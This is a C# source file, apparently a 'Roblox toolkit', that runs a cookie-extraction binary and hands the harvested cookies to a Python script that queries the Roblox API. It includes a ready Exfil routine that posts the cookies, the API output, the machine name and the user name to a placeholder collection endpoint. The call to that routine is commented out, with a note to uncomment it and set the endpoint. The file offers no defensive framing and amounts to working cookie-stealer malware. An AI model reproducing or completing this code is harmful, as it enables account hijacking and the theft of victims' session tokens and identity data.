using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace RobloxToolkit
{
    class Program
    {
        static readonly string CoreExe = "cookie_extract.exe";
        static readonly string PyScript = "roblox_api.py";
        static readonly string WorkDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "rblx_tk");

        static async Task<int> Main(string[] args)
        {
            Directory.CreateDirectory(WorkDir);
            Console.WriteLine("[*] roblox toolkit starting");
            Console.WriteLine("[*] workdir: " + WorkDir);

            // 1. run the C++ extractor
            string cookieJson = RunAndCapture(CoreExe, "");
            if (string.IsNullOrWhiteSpace(cookieJson))
            {
                Console.WriteLine("[!] extractor returned nothing");
                return 1;
            }
            string cookieFile = Path.Combine(WorkDir, "cookies.json");
            File.WriteAllText(cookieFile, cookieJson);
            Console.WriteLine("[+] cookies written: " + cookieFile);

            // 2. run python against it
            string pyOut = RunAndCapture("python", $"{PyScript} --cookies \"{cookieFile}\"");
            Console.WriteLine("[+] python output:\n" + pyOut);

            // 3. (optional) exfil — uncomment and set your endpoint
            // await Exfil(cookieJson, pyOut);

            Console.WriteLine("[*] done");
            return 0;
        }

        static string RunAndCapture(string exe, string args)
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory
            };
            using var p = Process.Start(psi);
            string outp = p.StandardOutput.ReadToEnd();
            string err = p.StandardError.ReadToEnd();
            p.WaitForExit();
            if (!string.IsNullOrEmpty(err))
                Console.Error.WriteLine("[stderr] " + err);
            return outp;
        }

        static async Task Exfil(string cookies, string pyOut)
        {
            using var http = new HttpClient();
            var payload = new
            {
                host = Environment.MachineName,
                user = Environment.UserName,
                cookies = cookies,
                api_dump = pyOut,
                ts = DateTime.UtcNow.ToString("o")
            };
            string json = System.Text.Json.JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var resp = await http.PostAsync("https://your-endpoint.example/collect", content);
                Console.WriteLine("[+] exfil status: " + resp.StatusCode);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] exfil failed: " + e.Message);
            }
        }
    }
}